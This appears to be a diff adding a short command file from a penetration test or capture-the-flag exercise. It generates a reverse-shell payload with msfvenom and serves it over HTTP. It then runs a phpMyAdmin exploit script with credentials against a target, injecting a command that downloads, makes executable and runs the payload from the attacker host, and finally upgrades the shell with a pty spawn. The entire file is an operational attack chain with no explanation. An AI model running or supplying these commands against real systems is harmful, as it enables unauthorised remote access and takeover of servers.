@@ -1,0 +1,5 @@
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.0.9 LPORT=4444 -f elf >shell.elf
+python3 -m http.server
+python3 50457.py 40.0.5.8 80 /phpmyadmin pma pmapass "cd /tmp; rm -f /tmp/self.elf; wget http://30.0.0.9:8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
